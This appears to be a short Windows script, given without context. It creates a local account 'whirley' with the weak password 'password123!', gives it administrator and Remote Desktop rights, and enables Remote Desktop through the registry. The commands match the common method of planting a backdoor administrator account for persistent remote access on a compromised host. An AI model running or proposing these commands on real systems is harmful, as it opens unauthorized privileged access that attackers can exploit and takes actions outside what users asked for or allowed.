net user /add whirley password123!
net localgroup administrators whirley /add
net localgroup "Remote Desktop Users" whirley  /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

